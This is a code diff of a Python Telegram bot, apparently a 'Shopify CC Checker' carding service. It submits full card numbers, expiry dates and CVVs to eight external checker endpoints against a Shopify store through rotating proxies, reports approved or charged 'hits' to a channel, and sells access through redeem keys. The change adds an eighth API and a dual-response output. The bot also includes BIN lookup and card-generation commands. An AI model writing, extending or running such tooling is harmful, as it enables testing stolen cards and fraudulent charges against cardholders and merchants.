@@ -28,13 +28,14 @@ def run_server():
     server = HTTPServer(("0.0.0.0", port), SimpleHandler)
     server.serve_forever()
 
-# 🚀 Self-Ping function (Keeps all URLs active)
+# 🚀 Self-Ping function
 def keep_alive_ping():
     railway_url = os.environ.get("RAILWAY_STATIC_URL") or os.environ.get("RENDER_EXTERNAL_URL")
     
     extra_urls = [
         "https://cozy-abundance-production-88ca.up.railway.app/status",
-        "https://lucid-flow-production-ebd1.up.railway.app/status"
+        "https://lucid-flow-production-ebd1.up.railway.app/status",
+        "https://balanced-presence-production-c2f7.up.railway.app/status"
     ]
     
     while True:
@@ -146,7 +147,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     welcome_text = (
         f"Hello {user.first_name}!\n\n"
-        f"🤖 Shopify CC Checker Bot is Online (7 APIs + Bin & Gen Active)\n"
+        f"🤖 Shopify CC Checker Bot is Online (8 APIs + Double Response Active)\n"
         f"⚠️ Use /redeem <key> to activate access.\n"
         f"👑 Owner: {OWNER_USERNAME}"
     )
@@ -308,7 +309,6 @@ async def get_bin_info(bin_code):
         pass
     return "UNKNOWN - UNKNOWN", "None", "UNKNOWN"
 
-# 🔍 NEW: /bin Command Handler
 async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
@@ -331,7 +331,6 @@ async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(msg)
 
-# 🔢 NEW: /gen Command Handler
 async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
@@ -392,10 +391,11 @@ async def process_card_string(card_line, user, context):
         bin_info, bank_info, country_info = await get_bin_info(cc[:6])
         
         site_url = "https://artpop.com"
-        selected_proxies = random.sample(PROXY_LIST, min(7, len(PROXY_LIST)))
+        selected_proxies = random.sample(PROXY_LIST, min(8, len(PROXY_LIST)))
         
-        res_data = None
+        valid_responses = []
         async with httpx.AsyncClient(timeout=25.0, follow_redirects=True) as client:
+            # 🌐 All 8 APIs Configured (Including your new balanced-presence API)
             url_1 = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[0])}"
             url_2 = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[1])}"
             url_3 = f"http://216.250.119.63/?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[2])}"
@@ -403,6 +403,7 @@ async def process_card_string(card_line, user, context):
             url_5 = f"http://shopii-api-production.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[4])}"
             url_6 = f"https://cozy-abundance-production-88ca.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[5])}"
             url_7 = f"https://lucid-flow-production-ebd1.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[6])}"
+            url_8 = f"https://balanced-presence-production-c2f7.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[7])}"
             
             tasks = [
                 fetch_api(client, url_1),
@@ -411,13 +412,13 @@ async def process_card_string(card_line, user, context):
                 fetch_api(client, url_4),
                 fetch_api(client, url_5),
                 fetch_api(client, url_6),
-                fetch_api(client, url_7)
+                fetch_api(client, url_7),
+                fetch_api(client, url_8)
             ]
             
             completed = await asyncio.gather(*tasks)
             
-            valid_responses = []
-            for res in completed:
+            for i, res in enumerate(completed):
                 if res and isinstance(res, dict):
                     resp_status = str(res.get("Response", "")).lower()
                     approved = str(res.get("Approved", "false")).lower()
@@ -431,34 +432,50 @@ async def process_card_string(card_line, user, context):
                     else:
                         score = 1
                         
-                    valid_responses.append((score, res))
+                    valid_responses.append((score, i + 1, res))
             
             if valid_responses:
+                # Sort by score descending
                 valid_responses.sort(key=lambda x: x[0], reverse=True)
-                res_data = valid_responses[0][1]
 
-        if not res_data:
-            return f"❌ {card_line} ➔ All 7 APIs & Proxies failed/timed out."
+        if not valid_responses:
+            return f"❌ {card_line} ➔ All 8 APIs & Proxies failed/timed out."
         
-        resp_status = res_data.get("Response", "UNKNOWN")
-        price = res_data.get("Price", "$14.97")
-        gate = res_data.get("Gate", "Shopify Payments")
-        approved = str(res_data.get("Approved", "False"))
-        charged = str(res_data.get("Charged", "False"))
+        # 🎯 Double Response / Best Responses Selection
+        best_data = valid_responses[0][2]
+        best_api_num = valid_responses[0][1]
         
-        is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower() or "hit" in resp_status.lower())
-        hit_title = "⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!" if is_success else "❌💠 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝!"
+        # Second best response agar available ho toh wo bhi le lenge (Double Response)
+        second_data = valid_responses[1][2] if len(valid_responses) > 1 else best_data
+        second_api_num = valid_responses[1][1] if len(valid_responses) > 1 else best_api_num
+
+        def format_res_block(res_data, api_num):
+            resp_status = res_data.get("Response", "UNKNOWN")
+            price = res_data.get("Price", "$14.97")
+            gate = res_data.get("Gate", "Shopify Payments")
+            approved = str(res_data.get("Approved", "False"))
+            charged = str(res_data.get("Charged", "False"))
+            
+            is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower() or "hit" in resp_status.lower())
+            hit_title = "⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!" if is_success else "❌💠 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝!"
+            
+            return hit_title, resp_status, gate, price, is_success
+
+        t1, s1, g1, p1, is_suc1 = format_res_block(best_data, best_api_num)
+        t2, s2, g2, p2, is_suc2 = format_res_block(second_data, second_api_num)
         
+        final_is_success = is_suc1 or is_suc2
         masked_cc = f"{cc[:6]}******{cc[-4:]}|{mes}|{ano}|{cvv}" if len(cc) >= 10 else "******"
         
-        if is_success:
+        if final_is_success:
             username_str = f"@{user.username}" if user.username else "No Username"
             channel_msg = (
-                f"⚡💳  # NEW HIT FOUND  💳⚡\n"
+                f"⚡💳  # NEW HIT FOUND (8 APIs) 💳⚡\n"
                 f"━━━━━━━━━━━━━━━━━\n"
-                f"⚠️ Status: {resp_status}\n"
+                f"⚠️ Primary Status: {s1} (API #{best_api_num})\n"
+                f"⚠️ Secondary Status: {s2} (API #{second_api_num})\n"
                 f"💳 Card: `{masked_cc}`\n"
-                f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
+                f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {g1} | 💰 {p1}\n"
                 f"━━━━━━━━━━━━━━━━━\n"
                 f"𝗕𝗜𝗡: {bin_info} | 𝗕𝗮𝗻𝗸: {bank_info}\n"
                 f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
@@ -472,12 +489,17 @@ async def process_card_string(card_line, user, context):
                 pass
 
         return (
-            f"⚡💳  # PRIME CHECKER 💳⚡\n"
+            f"⚡💳  # PRIME CHECKER (8 APIs Double Response) 💳⚡\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"{hit_title}\n"
-            f"⚠️ Status: {resp_status}\n"
+            f"🔥 **[Best Response - API #{best_api_num}]**\n"
+            f"{t1}\n"
+            f"⚠️ Status: {s1}\n"
+            f"🌐 Gateway: {g1} | 💰 {p1}\n"
+            f"---------------------------------\n"
+            f"⚡ **[Secondary Response - API #{second_api_num}]**\n"
+            f"⚠️ Status: {s2}\n"
+            f"---------------------------------\n"
             f"💳 Card: {formatted_cc}\n"
-            f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
             f"━━━━━━━━━━━━━━━━━\n"
             f"𝗕𝗜𝗡: {bin_info} | 𝗕𝗮𝗻𝗸: {bank_info}\n"
             f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
@@ -502,7 +524,7 @@ async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if not context.args:
         return
-    msg = await update.message.reply_text("⏳ Checking across 7 APIs & selecting best response...")
+    msg = await update.message.reply_text("⏳ Checking across 8 APIs with Double Response...")
     result = await process_card_string(" ".join(context.args), update.effective_user, context)
     await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=result)
 
@@ -521,7 +543,7 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not card_lines:
         return
 
-    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards via 7 APIs...")
+    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards via 8 APIs...")
     tasks = [safe_process_card(line, update.effective_user, context) for line in card_lines]
     results = await asyncio.gather(*tasks)
     
@@ -542,7 +564,7 @@ async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not document:
         return
     
-    status_msg = await update.message.reply_text("⏳ Processing file through 7 APIs...")
+    status_msg = await update.message.reply_text("⏳ Processing file through 8 APIs...")
     try:
         file = await context.bot.get_file(document.file_id)
         file_bytes = await file.download_as_bytearray()
@@ -581,11 +603,8 @@ def main():
     app.add_handler(CommandHandler("chk", chk_card))
     app.add_handler(CommandHandler("chks", chks_cards))
     app.add_handler(CommandHandler("chf", chf_file_check))
-    
-    # 🔗 NEW HANDLERS REGISTERED HERE
     app.add_handler(CommandHandler("bin", bin_command))
     app.add_handler(CommandHandler("gen", gen_command))
-    
     app.add_handler(MessageHandler(filters.Document.ALL, chf_file_check))
     
     while True:
